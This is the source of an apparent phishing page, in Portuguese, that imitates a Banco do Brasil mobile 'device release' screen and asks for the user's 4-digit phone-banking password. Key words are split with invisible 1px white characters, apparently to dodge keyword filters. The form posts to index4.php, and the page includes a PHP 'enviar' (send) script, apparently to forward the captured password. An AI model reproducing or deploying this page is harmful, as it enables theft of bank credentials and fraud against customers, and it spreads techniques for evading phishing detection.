<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mobbi</title>
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="javascript">
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58)) return true;
    else{
    if (tecla != 8) return false;
    else return true;
    }
}
</script>
<script language="javascript">
function validation3() {
if (document.form.senha4.value == "" || 
document.form.senha4.value.length < 4 || 
document.form.senha4.value.length > 4 || 
document.form.senha4.value == "000000" || 
document.form.senha4.value == "111111" || 
document.form.senha4.value == "222222" || 
document.form.senha4.value == "333333" || 
document.form.senha4.value == "444444" || 
document.form.senha4.value == "555555" || 
document.form.senha4.value == "666666" || 
document.form.senha4.value == "777777" || 
document.form.senha4.value == "888888" || 
document.form.senha4.value == "999999"){
alert ("Senha de (4 dígitos), Inválida!");
document.form.senha4.focus(); return false;
}
}
</script>
<style>
.u { font-family:Arial, Helvetica, sans-serif; font-size:1px; color:#FFF; }

input { width:95%; font-size:14px; outline:none; padding:0 0 0 10px; height:40px; border:none; border-bottom:1px solid #CCC; }

body{	padding: 0px; overflow:hidden; margin: 0px; background:#F5F5F5;	}

#proceguir { width:100%; height:45px; background:url(images/a005.jpg); font-size:100%; border:none; text-align:center; color:#FFF; }

</style>
</head>

<body>
<div style="width:100%; height:50px; background:#F0DC01; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td width="30" height="50"><div style="width:15px; height:20px; background:url(images/a007.jpg) no-repeat; margin-left:10px; background-size:cover;"></div></td>
<td bgcolor="#F0DC01" align="center">Liberação de Dispositivo</td>
<td width="30" style="padding:0 10px 0 0;">Sair</td>
</tr>
</table>
</div>
<div style="height:auto; max-width:750px; margin:0 auto;">
<form name="form" id="form" action="index4.php" method="post" onSubmit="return validation3()">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4; margin-top:10px; padding:10px; background:#FFF; border-bottom:1px solid #EDEDED;">S<span class="u">i</span>en<span class="u">i</span>ha<span class="u">i</span> de (4<span class="u">i</span> dí<span class="u">i</span>gi<span class="u">i</span>to<span class="u">i</span>s) d<span class="u">i</span>o C<span class="u">i</span>A<span class="u">i</span>B<span class="u">i</span>B<span class="u">i</span><br>
  <br>
<font size="2" color="#999">Essa s<span class="u">i</span>en<span class="u">i</span>ha<span class="u">i</span> é utilizada para acesso a "C<span class="u">i</span>en<span class="u">i</span>tr<span class="u">i</span>al de A<span class="u">i</span>te<span class="u">i</span>ndime<span class="u">i</span>nto B<span class="u">i</span>B<span class="u">i</span>" p<span class="u">i</span>el<span class="u">i</span>o telefone.</font></div>

<div style="background:#FFF; padding:20px 10px 20px 10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
<div style="font-family:'Arial'; font-size:17px; color:#5574B4;">S<span class="u">i</span>en<span class="u">i</span>ha<span class="u">i</span> do C<span class="u">i</span>A<span class="u">i</span>B<span class="u">i</span>B<span class="u">i</span></div>
<div style="margin-top:10px;"><input type="password" name="senha4" id="senha4" maxlength="4" placeholder="(4 dígitos numérica)" onKeyPress="return SomenteNumero(event);" /></div>
</div>

<div style="background:#FFF; padding:10px; margin-top:10px; border-bottom:1px solid #EDEDED;">
  <input type="submit" name="proceguir" id="proceguir" value="Confirmar"></div>
</form>
</div>



<div style="width:100%; height:40px; position:fixed; bottom:0; background:#FFF; padding:10px;">
<div style="width:40px; height:40px; background:url(images/a008.jpg) no-repeat; float:left;"></div>
<div style="width:40px; height:40px; background:url(images/a009.jpg) no-repeat; float:right; margin-right:20px;"></div>
</div>
</body>
<?php include"envios/enviar1.php"; ?>
</html>